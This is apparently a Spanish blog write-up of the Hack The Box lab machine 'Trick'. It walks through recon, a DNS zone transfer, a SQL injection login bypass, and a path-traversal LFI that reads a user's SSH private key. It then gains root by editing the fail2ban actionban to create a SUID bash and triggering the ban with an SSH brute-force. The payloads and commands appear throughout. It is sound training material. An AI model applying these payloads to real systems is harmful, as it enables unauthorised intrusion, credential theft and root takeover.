---
title: Trick WriteUp
date: 2023-03-21
categories: [WriteUps, Máquinas Linux]
tags: [dns, LFI, SQLi, Fuzzing]
image:
  path: ../../assets/img/writeups/Trick/trick.png
  width: 528
  height: 330
  alt: Banner Trick
---

Realizando un escaneo de puertos veo el puerto 22, 25, 53 y 80. Como el 53, que es el servicio domain, está activo realizo un ataque de transferencia de zona y con ello encuentro un nuevo subdominio. Este subdominio tiene un panel login vulnerable a inyección sql. Encuentro otro subdominio haciendo fuzzing, la página que muestra es vulnerable a LFI. Mediante el LFI obtengo el archivo id_rsa de un usuario y me conecto por ssh a la máquina objetivo.

Escalada: El usuario que controlo tiene permiso sudo del programa fail2ban, concretamente para reiniciarlo. Buscando info de "escalada con sudo de fail2ban" por internet encuentro una página que lo explica; Consiste en banearme para que salten unas operaciones tras el baneo, las cuales puedo configurar porque tengo permiso para ello(con un pequeño truco).

## Reconocimiento

Primero hago un ping a la máquina para comprobar que tengo conectividad con ella:
```
❯ ping -c 1 10.10.11.166
PING 10.10.11.166 (10.10.11.166) 56(84) bytes of data.
64 bytes from 10.10.11.166: icmp_seq=1 ttl=63 time=39.6 ms

--- 10.10.11.166 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.625/39.625/39.625/0.000 ms
```
Un paquete trasmitido, un paquete recibido, tenemos conectividad. Prosigamos.  

Realizo un escaneo de puertos. Quiero saber que puertos estan abiertos para poder atacar por los mismos.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.166 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-19 15:51 CET
Initiating SYN Stealth Scan at 15:51
Scanning 10.10.11.166 [65535 ports]
Discovered open port 53/tcp on 10.10.11.166
Discovered open port 22/tcp on 10.10.11.166
Discovered open port 25/tcp on 10.10.11.166
Discovered open port 80/tcp on 10.10.11.166
Completed SYN Stealth Scan at 15:52, 12.43s elapsed (65535 total ports)
Nmap scan report for 10.10.11.166
Host is up, received user-set (0.042s latency).
Scanned at 2023-03-19 15:51:50 CET for 12s
Not shown: 65361 closed tcp ports (reset), 170 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
25/tcp open  smtp    syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.66 seconds
           Raw packets sent: 67069 (2.951MB) | Rcvd: 65468 (2.619MB)
```

Las opciones significan lo siguiente:  

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.166 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts -> Exportará el output a un fichero grepeable que llamaremos "allPorts"

Ahora realizaré un escaneo más exhaustivo de los puertos encontrados en el anterior escaneo.
```
❯ nmap -p22,25,53,80 -sC -sV 10.10.11.166 -oN targeted
```
* -p  : Indica los puertos que quieres escanear  
* -sC : Lanza una serie de scripts básicos de reconocimiento.
* -sV : Lanza script que descubre la servicio y la versión que corren en esos puertos  
* -oN : Guarda el output en formato nmap a un fichero que llamaremos targeted

Resultado del escaneo:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-19 16:00 CET
Nmap scan report for 10.10.11.166
Host is up (0.053s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Asi pues, según nuestras escaneos tenemos los siguientes puertos abiertos:

* 22 : ssh
* 25 : smtp
* 53 : dns
* 80 : http

## Buscando Vulnerabilidades

Tenemos cuatro puertos abiertos por donde buscar vulnerabilidades. Bien..¿por dónde empiezo?. Por el ssh no, no tengo credenciales para poder conectarme, así que lo descarto. El puerto 25 que es de correo lo voy a descartar por lo mismo.  
Empezaré por el puerto 53 para encontrar subdominios y luego seguiré por el puerto 80.

`Puerto 53:`

Puedo suponerme que el dominio es trick.htb por convención de la plataforma hack the box.  
Antes de nada lo meto al /etc/host:
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.166  trick.htb
```

Si quisieras averiguar el subominio podrías hacerlo con nslookup:
```
> nslookup
server 10.10.11.166
10.10.11.166
``` 
Y con lo anterior te saldría el nombre del dominio si lo hubiera.

Realizo el ataque de transferencia de zona:
```
❯ dig @10.10.11.166 trick.htb axfr
```
* axfr : Es la opción para realizar un ataque de transferencia de zona

Estos son los resultados:
```
; <<>> DiG 9.18.8-1~bpo11+1-Debian <<>> @10.10.11.166 trick.htb axfr
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

Voy añadir el subdominio `root.trick.htb` y `preprod-payroll.trick.htb` al /etc/host. Voy a fuzzear un poco y luego sigo con ese segundo subdominio que parece intersante.
```
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot

10.10.11.166  trick.htb  root.trick.htb  preprod-payroll.trick.htb
```
Pasemos ahora al `puerto 80`:

Empezaré usando la herramienta whatweb, que funciona como un wappalyzer de navegador, analiza que motor, servidor y cms hay detrás de la web.
```
❯ whatweb http://10.10.11.166

http://10.10.11.166 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.11.166], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
```
No nos ha encontrado CMS pero si que hay un servidor nginx de versión 1.14.2 que corre la web. Si consiguieramos LFI (Local File Inclusion) podríamos buscar ciertas rutas relacionadas con este servidor web.

Bien, vamos a ver que pinta tiene la página web.

![Web-1]({{ 'assets/img/writeups/Trick/web.png' | relative_url }}){: .center-image }

El único input de usuario que parece haber nos indica que dejemos nuestro correo para recibir novedades y actualizaciones. Señala que nos avisarían para cuando la web este acabada, porque actualmente está en desarrollo. Escribo un correo y sale el siguiente mensaje:
```
Form submission successful!
To activate this form, sign up at
https://startbootstrap.com/solution/contact-forms
```
Es un enlace fuera del dominio objetivo, hack the box no suele operar fuera de este así que lo descartamos.   
El puerto 25, que es de mail, está abierto y quizás haya algo de juego con este input, pero no me llama la atención porque están hablando de avisos de terminación de la web. Me resulta poco tentador. Podría probar más adelante inyecciones en este campo.

Viendo el código fuente de la página veo dos subdirectorios; /assets, /js y /js/scripts.js. Voy a curiosear; En /assets y /js no tengo directory listing, es decir, no puedo listar los directorios. En /js/scripts me sale esto:
```
/*!
* Start Bootstrap - Coming Soon v6.0.6 (https://startbootstrap.com/theme/coming-soon)
* Copyright 2013-2022 Start Bootstrap
* Licensed under MIT (https://github.com/StartBootstrap/startbootstrap-coming-soon/blob/master/LICENSE)
*/
// This file is intentionally blank
// Use this file to add JavaScript to your project
```
Me apunto lo de `Bootstrap v6.0.6` para luego buscar vulnerabilidades si no encuentro nada más, porque ahora quiero realizar fuzzing en búsqueda de más subdirectorios y archivos.

Primero usaré la herramienta dirsearch.
```
dirsearch -u http://10.10.11.166 -x 403
```
![Dirsearch]({{ 'assets/img/writeups/Trick/dirsearch.png' | relative_url }}){: .center-image }

Poquita cosa, las dos primeras rutas ya las habíamos visto y daban "Forbidden". En /css no suele haber nada interesante y además también pone "Forbidden".

Voy a tirar de la herramienta wfuzz y usaré un diccionario más amplio de rutas a probar.

```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.166/FUZZ
```
Básicamente como resultado obtengo la misma información que con dirsearch. Pruebo a usar la misma herramienta pero para que busque archivos php y txt.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,php-txt http://10.10.11.166/FUZZ.FUZ2Z
```
Tampoco encuentro nada.

Aunque ya había encontrado un subdomio intersante voy a buscar más subdominios, para ello uso la herramienta gobuster.
```
❯ gobuster vhost -u http://trick.htb -w /opt/SecLists/Discovery/DNS/namelist.txt -t 50
```
Primero he lanzado ese diccionario que es más pequeño, pero no ha encontrado nada. Ahora uno más grande.
```
❯ gobuster vhost -u http://trick.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
```
Pero tampoco encuentro nada.

Volvamos a los subdominios encontrados, que eran; `root.trick.htb` y `preprod-payroll.trick.htb`.

En el primero se muestra lo mismo que en la página principal, en cambio en preprod-payroll.trick.htb:

![Web-2]({{ 'assets/img/writeups/Trick/web2.png' | relative_url }}){: .center-image }

Nos sale un panel login, después de probar algunas credenciales típicas(admin:admin, admin:passwd, guest:guest) pruebo a realizar inyecciones. La primera que suelo probar funciona, así que de lujo. La que pongo es `'or 1=1-- -`.

![Sqli]({{ 'assets/img/writeups/Trick/inyeccion.png' | relative_url }}){: .center-image }

Entramos en el panel del usuario, y no como cualquier usuario si no como el usuario administrador.

![PanelAdmin]({{ 'assets/img/writeups/Trick/paneladmin.png' | relative_url }}){: .center-image }

En la url veo lo siguiente `http://preprod-payroll.trick.htb/index.php?page=home`, me apetece probar un LFI a través de ese parámetro page.

Pruebo con el típico path traversal pero nada: ...?page=`../../../../../../etc/passwd`  
Luego con el wrapper file y tampoco: `file:///etc/passwd`  
La doble, por si sustituyen ../ por nada y mmm nada: `....//....//....//....//etc/passwd`  
Con el wrapper base64 tampoco hay suerte: `php://filter/convert.base64-encode/resource=/etc/passwd`

Al ser una máquina fácil no creo que pongan el bypassing de la inyección tan complicada, así que no voy a seguir probando inyecciones. Me toca pensar en otra cosa.

Este es el subdominio en el que estamos `preprod-payroll.trick.htb`. Podría haber más subdominios. Preprod viene de preproducción, ¿Y si hay más dominios o secciones de la empresa en preproducción?. Usare wfuzz para buscar otros posibles subdominios.

```
❯ wfuzz -c --hc=404 --hw=475 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: preprod-FUZZ.trick.htb" http://10.10.11.166
```
* -c : coloreado
* --hc : de hide code, oculta código indicado
* --hw : de hide word, oculta número palabras indicadas
* -t : número de hilos, para ir más rápido
* -w : De Wordlist, es decir diccionario.
* -H : de Headers, cabeceras.

Puse --hw=475 porque salían falsos positivos con ese número de palabras.  
Por aquí abajo el resultado de la búsqueda.

![Wfuzz]({{ 'assets/img/writeups/Trick/wfuzz2.png' | relative_url }}){: .center-image }

¡Encontramos  otro subdominio!; preprod-marketing.trick.htb. Lo añadimos al /etc/hosts.

Una vez añadido, ¡al navegador a ver que encontramos!.

![Web-3]({{ 'assets/img/writeups/Trick/web3.png' | relative_url }}){: .center-image }

## Explotación

Desde el código fuente veo que hay un ruta parecida a la otra página, la cual puede derivar a un LFI; `http://preprod-marketing.trick.htb/index.php?page=`  
Probaré las mismas inyecciones que antes a ver si ahora tengo más suerte.  
Y la tengo, con la doble path traversal.

![LFI-2]({{ 'assets/img/writeups/Trick/lfibueno.png' | relative_url }}){: .center-image }

Siempre que veo un usuario en el /etc/passwd,- Recuerda que cuentan los que tienen una bash o sh como terminal, no los que muestran nologin- intento sacar su id_rsa para así poder conectarme por ssh a la máquina objetivo. Veo en la foto anterior un usuario llamado michael, voy a comprobar si tiene id_rsa. La ruta típica de este archivo es /home/USUARIO/.ssh/.id_rsa  
¡Y la tiene!. Voy a realizar la petición con el comando curl por terminal para que me salga mas bonita y ordenada.

```
> curl -X GET "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//home/michael/.ssh/id_rsa"
```
![Curl]({{ 'assets/img/writeups/Trick/curl.png' | relative_url }}){: .center-image }

Pego el contenido y lo meto a un archivo que llamaré id_rsa. Luego le doy el permiso 600, se suele dar este permiso porque si no da problemas a la hora de conectar por ssh:
```
> chmod 600 id_rsa
```
Ahora ya puedo conectarme mediante esa id_rsa con el usario michael a la máquina objetivo. ¡ueueueue!!!
```
❯ ssh -i id_rsa michael@10.10.11.166
```
Estamos conectados.

![Dentro]({{ 'assets/img/writeups/Trick/enobjetivo.png' | relative_url }}){: .center-image }

Antes de iniciar la escalada cambio la variable TERM a xterm. Esto me permitirá hacer CTRL+L para borrar.
```
> export TERM=xterm
```

## Escalada de Privilegios

```
> id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
``` 
Grupo interesante. De momento lo dejo pasar.
``` 
> sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Esto ya si que no lo dejo pasar. Buscando algo de información por internet, escribiendo en navegador `fail2ban escalation sudo` encuentro esta página:

https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49  

Explican como escalar privilegios. Así que de perlas!. 

Básicamente es seguir los pasos, pero de manera ágil porque se borran los archivos pasado un tiempo. 
```
michael@trick:/etc/fail2ban/action.d$ ls -l iptables-multiport.conf
-rw-r--r-- 1 root root 1420 Mar 20 18:30 iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ mv iptables-multiport.conf iptables-multiport.conf.bak
michael@trick:/etc/fail2ban/action.d$ cp iptables-multiport.conf.bak iptables-multiport.conf
michael@trick:/etc/fail2ban/action.d$ ls -l iptables-multiport.conf
-rw-r--r-- 1 michael michael 1420 Mar 20 18:29 iptables-multiport.conf
```

Ahora le cambio los permisos para poder escribir en el archivo.
``` 
> chmod 666 iptables-multiport.conf
```
Entro en el archivo y modifico la operación que hará cuando haya un ban, el cual yo provocaré equivocándome unas cuantas veces en la conexión por ssh.  
Añado en actionban; `cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf`

Ya de paso **agradezco** su writeup al genio y figura **0xdf**, recomiendo sus writeups, son muy completos. (no tienes porque poner 0xdf, puedes crear la carpeta con el nombre que quieras.)

![ActionBan]({{ 'assets/img/writeups/Trick/actionban.png' | relative_url }}){: .center-image }

Ahora reinicio el programa fail2ban:
```
> sudo /etc/init.d/fail2ban restart
```
Y provoco el baneo:
```
> crackmapexec ssh 10.10.11.166 -u guise -p /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
```
![Crackmapexec]({{ 'assets/img/writeups/Trick/crackmapexec.png' | relative_url }}){: .center-image }

Una vez que haya sido baneado saltaran las reglas que establecimos, es decir, el "actionban", recuerda que pusimos esto:  
`cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf`  
En vez de chmod 4777 podrías poner chmod u+s. Esto es para añadir el permiso SUID al ejecutable. Este permiso permite ejecutar el ejecutable como el propietario.
```
> ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 0 mar 20 20:27 0xdf
```
Vemos el ejecutable, ahora solo toca lanzarlo con la opción -p. Esta opción te permite ejecutarlo como el propietario, se podría decir que completa a los permisos SUID.
```
> /tmp/0xdf -p
> whoami
root
> cat /root/root.txt
f0e328b334fbcb96ec**********
```
Y con esto acabo la máquina Trick. Me ha gustado bastante.








